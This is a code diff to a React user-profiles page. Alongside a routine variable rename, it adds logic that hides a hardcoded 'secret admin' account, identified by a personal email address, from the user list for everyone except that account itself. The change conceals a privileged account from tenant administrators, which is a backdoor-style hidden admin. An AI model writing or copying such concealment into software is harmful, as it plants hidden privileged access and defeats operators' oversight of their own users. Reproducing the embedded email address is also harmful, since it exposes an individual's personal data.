@@ -22,7 +22,7 @@ const PERMISSIONS_LIST = [
 ];
 
 export default function PageUserProfiles({ t, isDark, USERS = [], GLOBAL_USERS = [], ROLES = [], collectionPath = "", DIMENSIONS = [], tenantId = "", TENANTS = [], CONTACTS = [] }) {
-    const { hasPermission, isSuperAdmin } = useAuth();
+    const { hasPermission, isSuperAdmin, user } = useAuth();
     const canCreate = isSuperAdmin || hasPermission("USER_PROFILE_CREATE") || hasPermission("USER_CREATE");
     const canInvite = isSuperAdmin || hasPermission("USER_PROFILE_CREATE") || hasPermission("USER_INVITE");
     const canUpdate = isSuperAdmin || hasPermission("USER_PROFILE_UPDATE") || hasPermission("USER_UPDATE");
@@ -53,31 +53,40 @@ export default function PageUserProfiles({ t, isDark, USERS = [], GLOBAL_USERS =
 
     // Merge tenant users with global users data (for first_name/last_name)
     const mergedUsers = useMemo(() => {
-        return USERS.map(user => {
+        return USERS.map(u => {
             // Find matching global user by auth_uid or email
             const globalUser = GLOBAL_USERS.find(gu =>
-                (user.auth_uid && gu.id === user.auth_uid) ||
-                (user.email && gu.email && gu.email.toLowerCase() === user.email.toLowerCase())
+                (u.auth_uid && gu.id === u.auth_uid) ||
+                (u.email && gu.email && gu.email.toLowerCase() === u.email.toLowerCase())
             );
 
             // Merge: use global user's first_name/last_name if available, otherwise use tenant user's
             return {
-                ...user,
-                first_name: globalUser?.first_name || user.first_name,
-                last_name: globalUser?.last_name || user.last_name
+                ...u,
+                first_name: globalUser?.first_name || u.first_name,
+                last_name: globalUser?.last_name || u.last_name
             };
         });
     }, [USERS, GLOBAL_USERS]);
 
-    // Filter out platform/global users (users with global roles)
+    // Filter out platform/global users AND secret admin (unless current user IS the secret admin)
     const filteredUsers = useMemo(() => {
-        return mergedUsers.filter(user => {
-            const roleId = user.role_id;
+        const currentUserEmail = user?.email?.toLowerCase();
+        const isSecretAdmin = currentUserEmail === 'kyuahn@yahoo.com';
+
+        return mergedUsers.filter(u => {
+            // Filter out secret admin from other users
+            if (!isSecretAdmin && u.email?.toLowerCase() === 'kyuahn@yahoo.com') {
+                return false;
+            }
+
+            // Filter out users with global roles
+            const roleId = u.role_id;
             if (!roleId) return true; // Include users without role
             const isGlobal = isSelectedRoleGlobal(roleId);
             return !isGlobal; // Exclude users with global roles
         });
-    }, [mergedUsers, ROLES]);
+    }, [mergedUsers, ROLES, user]);
 
     const nextUserId = useMemo(() => {
         if (filteredUsers.length === 0) return "U10001";
